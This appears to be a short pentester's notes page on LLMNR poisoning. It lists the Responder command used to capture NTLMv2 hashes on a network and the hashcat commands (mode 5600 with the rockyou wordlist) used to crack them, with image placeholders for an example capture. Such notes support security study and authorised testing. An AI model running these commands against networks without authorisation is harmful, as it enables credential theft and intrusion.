# LLMNR Poisoning(needs an event)

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption><p>Example Attack</p></figcaption></figure>



## Capturing Hashes With Responder

```
sudo responder -I <interface eth0/tun0> -dwPv
```

make sure when u run this ;all the servers it prints are \[ON]

Example of us capturing an hash

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Copy those hashes into a text file(BEST WAY TO CRACK IS TO USE UR ORIGINAL OS(DOWNLOAD HASHCAT THERE AND USE UR GPU))

```
hashcat --help | grep NTLMv2
```

We see the module is 5600 for NTLMv2

```
hashcat -m 5600 <ur hashesh.txt> /usr/share/wordlists/rockyou.txt
```

IF already cracked

```
hashcat -m 5600 <ur hashesh.txt> /usr/share/wordlists/rockyou.txt --show
```
